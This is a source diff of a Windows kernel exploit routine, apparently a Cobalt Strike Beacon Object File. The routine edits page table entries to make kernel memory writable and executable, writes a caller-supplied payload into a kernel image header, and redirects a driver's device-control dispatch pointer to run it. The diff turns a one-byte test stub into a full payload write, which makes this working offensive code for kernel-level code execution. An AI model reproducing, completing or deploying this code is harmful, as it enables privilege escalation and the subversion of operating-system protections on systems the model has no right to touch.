@@ -26,7 +26,6 @@ D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_
 {
 	HANDLE				Dev = NULL;
 	PVOID				Img = NULL;
-	ULONG_PTR			Bit = 0;
 
 	PVOID				Ctr = NULL;
 	PVOID				Obj = NULL;
@@ -45,11 +44,13 @@ D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_
 	DEVICE_OBJECT			Dvo;
 	DRIVER_OBJECT			Drv;
 
+	MMPTE				Mmp;
 	UNICODE_STRING			Uni;
 	IO_STATUS_BLOCK			Ios;
 	OBJECT_ATTRIBUTES		Att;
 	RTL_OSVERSIONINFOW		Ver;
 
+	RtlSecureZeroMemory( &Mmp, sizeof( Mmp ) );
 	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
 	RtlSecureZeroMemory( &Flo, sizeof( Flo ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
@@ -141,26 +142,16 @@ D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_
 					Pte = C_PTR( U_PTR( U_PTR( Pte ) & 0x7ffffffff8 ) );
 					Pte = C_PTR( U_PTR( U_PTR( Pte ) + U_PTR( Ptb ) ) );
 
-					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Bit, sizeof( Bit ), NULL ) ) 
-					{	
-						/**
-						 *
-						 * https://git.alnyan.me/yggdrasil/kernel/commit/cbb39f9d772f235a2eaf70f8525e5f4fcf7fca59.patch
-						 *
-						 * Inserts a MM_PAGE_WRITE & removes MM_PAGE_NOEXECUTE.
-						 *
-						 * Allowing us to read and write to the memory, as well
-						 * as execute kernel code.
-						 *
-						**/
+					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Mmp, sizeof( Mmp ), NULL ) ) 
+					{
+						/* Add W* and X* */
+						Mmp.u.Hard.NoExecute = 0;
+						Mmp.u.Hard.Write     = 1;
 
-						Bit = U_PTR( U_PTR( U_PTR( Bit ) & 0x0FFFFFFFFFFFFFFF ) );
-						Bit = U_PTR( U_PTR( U_PTR( Bit ) | ( 1 << 1 ) ) );
-						
-						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Bit, sizeof( PVOID ), NULL ) ) 
+						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Mmp, sizeof( Mmp ), NULL ) ) 
 						{
-							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Tgt, &( UCHAR ){ 0xC3 }, sizeof( UCHAR ), NULL ) >= 0 ) ) {
-								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write kernel shellcode to header. vbs enabled?" ) ) );
+							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Tgt, Buffer, Length, NULL ) >= 0 ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write to header." ) ) );
 								goto Leave;
 							};
 
@@ -199,13 +190,20 @@ D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_
 								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write driver object." ) ) );
 								goto Leave;
 							};
-							
-							/* Shellcode! */
+
 							Api->Beep( 37, 1 );
+
+							Tgt = C_PTR( Drv.MajorFunction[ 0x0e ] );
+							Drv.MajorFunction[ 0x0e ] = C_PTR( Ctr );
+
+							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Dvo.DriverObject, &Drv, sizeof( Drv ), NULL ) >= 0 ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write driver object." ) ) );
+								goto Leave;
+							};
 						} else {
-							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read gs base." ) ) );
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not modify PTE." ) ) );
+							goto Leave;
 						};
-						/* Set IRP_MJ_DEVICE_IO_CONTROL! */
 					} else {
 						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read pte control bit." ) ) );
 						goto Leave;
